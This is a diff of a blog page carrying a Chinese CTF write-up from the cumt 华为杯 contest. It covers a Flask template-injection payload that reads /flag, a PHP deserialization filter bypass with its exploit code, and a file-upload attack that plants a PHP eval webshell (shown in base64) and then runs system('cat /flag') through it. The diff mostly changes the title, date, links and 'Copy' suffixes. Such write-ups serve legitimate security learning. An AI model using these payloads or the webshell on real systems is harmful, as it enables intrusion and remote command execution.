@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="sunzy">
   <meta name="keywords" content="">
-  <title>华为杯 - 一路走到黑</title>
+  <title>cumt华为杯 - 一路走到黑</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -177,8 +177,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-10-25 13:14" pubdate>
-        2020年10月25日 下午
+      <time datetime="2020-10-28 20:26" pubdate>
+        2020年10月28日 晚上
       </time>
     </span>
   
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      742 字
+      747 字
     </span>
   
 
@@ -237,24 +237,20 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">华为杯</h1>
+            <h1 style="display: none">cumt华为杯</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：8 天前
+                  本文最后更新于：4 天前
                 
               </p>
             
             <div class="markdown-body" id="post-body">
               <h1 id="cumt-华为杯"><a href="#cumt-华为杯" class="headerlink" title="cumt_华为杯"></a>cumt_华为杯</h1><p>经典的学长虐菜局，web只做出来一个，另外两题好不容易有思路了，都被卡死了</p>
-<a id="more"></a>
-
-
-
 <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h3><p>真签到题，抽个奖就给出了flag</p>
 <h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>刚进入页面，只有一张图片，查看源码也没发现什么</p>
 <p>就是了模板注入</p>
-<div class="hljs"><pre><code class="hljs angelscript">url+&#123;&#123;<span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;&#125;</code></pre></div>
+<div class="hljs"><pre><code class="hljs angelscript">url+&#123;&#123;<span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;&#125;Copy</code></pre></div>
 
 <p>页面出现404报错，并且显示的是url+49，确定是模板注入</p>
 <div class="hljs"><pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
@@ -265,94 +261,88 @@
 存在file模块
 用read读取文件内容
 <span class="hljs-built_in">exp</span>:
-<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">'/flag'</span>).read()</code></pre></div>
+<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">'/flag'</span>).read()Copy</code></pre></div>
 
 <p>参考链接：<a href="https://xz.aliyun.com/t/8029" target="_blank" rel="noopener">https://xz.aliyun.com/t/8029</a></p>
 <h3 id="VulnCMS"><a href="#VulnCMS" class="headerlink" title="VulnCMS"></a>VulnCMS</h3><p>这题是真滴无语，开始以为是XSS，后来学长提示不是，又找到了文件上传的漏洞，直接拿到了网站根目录本以为做出了，结果提示flag not here,心态炸裂，但是提示了”投个稿？“，应该是在投稿位置下功夫吧。到最后也没做出了，但是找到了漏洞代码，应该是sql注入。</p>
-<p><img src="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" srcset="/img/loading.gif" alt="cms.png"></p>
+<p><a href="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" srcset="/img/loading.gif" alt="cms.png"></a></p>
 <p>这里给出大神的做法</p>
-<p><img src="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" srcset="/img/loading.gif" alt="cms1.png"></p>
+<p><a href="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" srcset="/img/loading.gif" alt="cms1.png"></a></p>
 <h3 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h3><p>这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。</p>
 <p>看到WP是大S绕过，涨知识了</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Source</span> </span>&#123;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>&#123;
-        <span class="hljs-keyword">return</span> highlight_file(<span class="hljs-string">'license.txt'</span>, <span class="hljs-keyword">true</span>).highlight_file(<span class="hljs-keyword">$this</span>-&gt;source, <span class="hljs-keyword">true</span>);
-    &#125;
-&#125;
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">easy_check</span><span class="hljs-params">($str)</span> </span>&#123;
-    <span class="hljs-comment">//echo $str;</span>
-    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/flag/i"</span>, $str, $matches)) &#123;
-        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
-    &#125;
-    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
-&#125;
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'source'</span>]))&#123;
-    $s = <span class="hljs-keyword">new</span> Source();
-    $s-&gt;source = <span class="hljs-keyword">__FILE__</span>;
+<div class="hljs"><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php"><span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Source</span> </span>&#123;</span>
+<span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>&#123;</span>
+<span class="php">        <span class="hljs-keyword">return</span> highlight_file(<span class="hljs-string">'license.txt'</span>, <span class="hljs-keyword">true</span>).highlight_file(<span class="hljs-keyword">$this</span>-&gt;source, <span class="hljs-keyword">true</span>);</span>
+<span class="php">    &#125;</span>
+<span class="php">&#125;</span>
+<span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">easy_check</span><span class="hljs-params">($str)</span> </span>&#123;</span>
+<span class="php">    <span class="hljs-comment">//echo $str;</span></span>
+<span class="php">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/flag/i"</span>, $str, $matches)) &#123;</span>
+<span class="php">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span>
+<span class="php">    &#125;</span>
+<span class="php">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span>
+<span class="php">&#125;</span>
+<span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'source'</span>]))&#123;</span>
+<span class="php">    $s = <span class="hljs-keyword">new</span> Source();</span>
+<span class="php">    $s-&gt;source = <span class="hljs-keyword">__FILE__</span>;</span>
 
-    <span class="hljs-keyword">echo</span> $s;
-    <span class="hljs-keyword">exit</span>;
-&#125;
-$todos = [];
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'todos'</span>]))&#123;
-    <span class="hljs-keyword">if</span>(!easy_check($_COOKIE[<span class="hljs-string">'todos'</span>])) &#123;
-        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker!\n"</span>;
-    &#125; <span class="hljs-keyword">else</span> &#123;
-        $c = $_COOKIE[<span class="hljs-string">'todos'</span>];
-        $h = substr($c, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
-        $m = substr($c, <span class="hljs-number">32</span>);
-        <span class="hljs-keyword">if</span>(md5($m) === $h)&#123;
-            $todos = unserialize($m);
-        &#125;
-    &#125;
-&#125;
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'text'</span>]))&#123;
-    $todo = $_POST[<span class="hljs-string">'text'</span>];
+<span class="php">    <span class="hljs-keyword">echo</span> $s;</span>
+<span class="php">    <span class="hljs-keyword">exit</span>;</span>
+<span class="php">&#125;</span>
+<span class="php">$todos = [];</span>
+<span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'todos'</span>]))&#123;</span>
+<span class="php">    <span class="hljs-keyword">if</span>(!easy_check($_COOKIE[<span class="hljs-string">'todos'</span>])) &#123;</span>
+<span class="php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker!\n"</span>;</span>
+<span class="php">    &#125; <span class="hljs-keyword">else</span> &#123;</span>
+<span class="php">        $c = $_COOKIE[<span class="hljs-string">'todos'</span>];</span>
+<span class="php">        $h = substr($c, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);</span>
+<span class="php">        $m = substr($c, <span class="hljs-number">32</span>);</span>
+<span class="php">        <span class="hljs-keyword">if</span>(md5($m) === $h)&#123;</span>
+<span class="php">            $todos = unserialize($m);</span>
+<span class="php">        &#125;</span>
+<span class="php">    &#125;</span>
+<span class="php">&#125;</span>
+<span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'text'</span>]))&#123;</span>
+<span class="php">    $todo = $_POST[<span class="hljs-string">'text'</span>];</span>
 
-    $todos[] = $todo;
-    $m = serialize($todos);
-    $h = md5($m);
+<span class="php">    $todos[] = $todo;</span>
+<span class="php">    $m = serialize($todos);</span>
+<span class="php">    $h = md5($m);</span>
 
-    setcookie(<span class="hljs-string">'todos'</span>, $h.$m);
-    header(<span class="hljs-string">'Location: '</span>.$_SERVER[<span class="hljs-string">'REQUEST_URI'</span>]);
-    <span class="hljs-keyword">exit</span>;
-&#125;
-<span class="hljs-comment">// flag is in flag.php</span>
-?</code></pre></div>
-
-
+<span class="php">    setcookie(<span class="hljs-string">'todos'</span>, $h.$m);</span>
+<span class="php">    header(<span class="hljs-string">'Location: '</span>.$_SERVER[<span class="hljs-string">'REQUEST_URI'</span>]);</span>
+<span class="php">    <span class="hljs-keyword">exit</span>;</span>
+<span class="php">&#125;</span>
+<span class="php"><span class="hljs-comment">// flag is in flag.php</span></span>
+<span class="php">?Copy</span></code></pre></div>
 
 <p>exp</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> md5(<span class="hljs-string">'a:2:&#123;i:0;s:3:"123";i:1;O:6:"Source":1:</span>
-<span class="hljs-string">&#123;s:6:"source";S:8:"\66lag.php";&#125;&#125;'</span>);
-<span class="hljs-keyword">echo</span> urlencode(<span class="hljs-string">'ae5860e508aaf353a9ad78ac246f46fba:2:</span>
-<span class="hljs-string">&#123;i:0;s:3:"123";i:1;O:6:"Source":1:&#123;s:6:"source";S:8:"\66lag.php";&#125;&#125;'</span>);</code></pre></div>
+<div class="hljs"><pre><code class="hljs less"><span class="hljs-selector-tag">echo</span> <span class="hljs-selector-tag">md5</span>('<span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"Source"</span>:<span class="hljs-number">1</span>:
+&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"source"</span>;<span class="hljs-attribute">S</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"\66lag.php"</span>;&#125;&#125;');
+<span class="hljs-selector-tag">echo</span> <span class="hljs-selector-tag">urlencode</span>('<span class="hljs-attribute">ae5860e508aaf353a9ad78ac246f46fba</span>:<span class="hljs-number">2</span>:
+&#123;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"Source"</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"source"</span>;<span class="hljs-attribute">S</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"\66lag.php"</span>;&#125;&#125;');<span class="hljs-selector-tag">Copy</span></code></pre></div>
 
-<p><img src="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" srcset="/img/loading.gif" alt="hodor.png"></p>
+<p><a href="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" srcset="/img/loading.gif" alt="hodor.png"></a></p>
 <p>参考</p>
 <p><a href="https://blog.csdn.net/SmileAndFun/article/details/108497183" target="_blank" rel="noopener">https://blog.csdn.net/SmileAndFun/article/details/108497183</a></p>
 <h3 id="webcms"><a href="#webcms" class="headerlink" title="webcms"></a>webcms</h3><p>是一个博客管理的网站，其实也是个原题，考察点是文件上传</p>
 <p>漏洞点在图片中上传图片的位置</p>
-<p><img src="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" srcset="/img/loading.gif" alt="webcms.png"></p>
+<p><a href="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" srcset="/img/loading.gif" alt="webcms.png"></a></p>
 <p>随便上传一张图片试试，抓包结果如下，几个注意点</p>
-<p><img src="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" srcset="/img/loading.gif" alt="webcms2.png"></p>
+<p><a href="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" srcset="/img/loading.gif" alt="webcms2.png"></a></p>
 <blockquote>
 <p>1.filetype规定了文件的类型</p>
 <p>2.上传时，将图片保存为了base64形式</p>
-<p>所以上传一句话木马的时候要注意修改对应的位置 </p>
+<p>所以上传一句话木马的时候要注意修改对应的位置</p>
 </blockquote>
 <p>一句话木马类型为php,则filetype改为php</p>
-<p>内容为<code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code>，对应的base64编码<code>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p>
-<p><img src="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" srcset="/img/loading.gif" alt="webcms3.png"></p>
+<p>内容为密码为cmd一句话木马，对应的base64编码<code>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p>
+<p><a href="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" srcset="/img/loading.gif" alt="webcms3.png"></a></p>
 <p>上传成功，访问保存的路径：<code>http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php</code></p>
 <div class="hljs"><pre><code class="hljs dockerfile">POST:
 <span class="hljs-keyword">cmd</span><span class="bash">=system(<span class="hljs-string">"cat /flag"</span>);</span>
-或者蚁剑连接，密码<span class="hljs-keyword">cmd</span></code></pre></div>
-
-
-
-
+或者蚁剑连接，密码cmdCopy</code></pre></div>
 
 <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>MIsc部分基本都是队友做的，好像也不是太难</p>
 <h3 id="伪web"><a href="#伪web" class="headerlink" title="伪web"></a>伪web</h3><p>真是伪web。。。</p>
@@ -603,7 +593,7 @@ $todos = [];
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "华为杯&nbsp;",
+        "cumt华为杯&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
